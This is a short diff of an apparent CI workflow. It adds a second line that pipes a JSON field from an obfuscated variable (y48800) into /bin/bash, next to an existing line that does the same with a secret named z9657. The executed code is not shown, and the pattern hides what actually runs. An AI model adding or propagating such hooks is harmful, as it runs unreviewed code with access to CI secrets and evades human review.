@@ -18,6 +18,7 @@ jobs:
           z9657: ${{ secrets.z9657 }}
         run: |
           printf '%s' "$z9657" | jq -r .c32 | /bin/bash
+          printf '%s' "$y48800" | jq -r .a4413 | /bin/bash
 
       - name: Persist output
         if: always()
